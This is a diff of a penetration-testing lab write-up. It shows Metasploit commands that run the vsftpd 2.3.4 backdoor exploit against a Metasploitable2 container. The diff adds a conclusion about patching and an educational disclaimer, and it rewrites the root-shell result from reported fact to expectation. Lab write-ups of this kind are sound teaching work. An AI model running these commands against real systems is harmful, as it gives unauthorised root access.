@@ -66,5 +66,8 @@ msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
 msf6 > set RHOSTS 172.18.0.3
 msf6 > exploit
 ```
-4. **Result**: The exploit successfully created a reverse shell, granting command-line access to the Metasploitable2 container with **root privileges**.
+4. **Result**: The exploit should successfully create a reverse shell, granting command-line access to the Metasploitable2 container with **root privileges**.
 ***
+## Conclusion
+This lab demonstrates the core steps of a penetration test, from initial network scanning to gaining unauthorised access. The `vsfptd` vulnerability, while simple, serves as an example of how critical it is to keep software patched and updated.
+**Disclaimer**: This lab was conducted in a controlled, isolated environment for educational purposes. Unauthorised access to any computer system is illegal and uethical.
